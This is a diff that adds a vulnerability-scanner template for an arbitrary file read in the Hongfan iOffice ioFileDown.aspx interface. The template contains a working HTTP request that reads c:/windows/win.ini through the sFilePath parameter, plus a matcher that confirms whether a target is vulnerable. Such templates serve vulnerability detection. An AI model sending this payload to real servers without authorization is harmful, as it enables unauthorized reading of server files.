@@ -1,0 +1,28 @@
+id: hongfan-ioffice-file-download
+
+info:
+  name: "红帆iOffice ioFileDown接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    漏洞影响红帆iOffice系统ioFileDown接口，攻击者可通过构造恶意请求读取服务器任意文件内容
+      该缺陷源于文件下载功能缺乏有效路径校验机制
+      reference: https://example.com/cve-details
+  tags: 红帆
+
+http:
+- raw:
+  - |
+    GET /ioffice/prg/interface/ioFileDown.aspx?sFilePath=c:/windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Connection: close
+    Accept: */*
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
